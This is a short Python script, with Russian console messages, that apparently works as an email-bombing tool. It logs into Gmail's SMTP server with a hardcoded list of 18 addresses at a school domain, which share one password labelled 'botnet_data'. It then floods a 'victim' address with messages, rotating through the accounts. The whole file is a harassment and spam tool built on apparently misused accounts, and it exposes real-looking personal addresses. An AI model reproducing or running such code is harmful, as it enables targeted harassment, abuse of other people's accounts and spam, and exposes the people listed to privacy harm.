# -*- coding: utf-8 -*-
# =========================================================================================================================================
import os
import random
import smtplib
import sys
import getpass
import time
gmails =['guschinas@sch2057.ru',
         'sidorina@sch2057.ru',
         'revnivtsevava@sch2057.ru',
         'senchishinmi@sch2057.ru',
         'tsygankovaiv@sch2057.ru',
         'krylovakd@sch2057.ru',
         'kutenkova@sch2057.ru',
         'galstyants@sch2057.ru',
         'tubashovpa@sch2057.ru',
         'dvoyanis@sch2057.ru',
         'verzunovae@sch2057.ru',
         'novikovda@sch2057.ru',
         'firsovavv@sch2057.ru',
         'ledovskihaa@sch2057.ru',
         'poddubnayaee@sch2057.ru',
         'solotinaaa@sch2057.ru',
         'parotikovaa@sch2057.ru',
         'greyish@sch2057.ru']
passv = 'botnet_data'
def start(user,passworde,message,hani,gmai):
    smtp_server = 'smtp.gmail.com'
    port = 587
    victime = gmai
    try:
        server = smtplib.SMTP(smtp_server,port) 
        server.ehlo()
        if smtp_server == "smtp.gmail.com":
                server.starttls()
        server.login(user,passworde)

        for i in range(1, hani+1):
            subject = os.urandom(9)
            msg = (message)
            server.sendmail(user,victime,msg)
            print(a,'отправка')
            sys.stdout.flush()
        server.quit()
        
        
    except KeyboardInterrupt:
        print ('Выход')
        sys.exit()
    except smtplib.SMTPAuthenticationError:
        print("Ошибка ")
a = 0
def spam_gmail(gmai,mess):
    global gmails
    global passv
    global a
    while True:
        for i in range(1):
            start(gmails[a],passv,mess,1,gmai)
            a = a + 1
            if a == 18:
                a = 0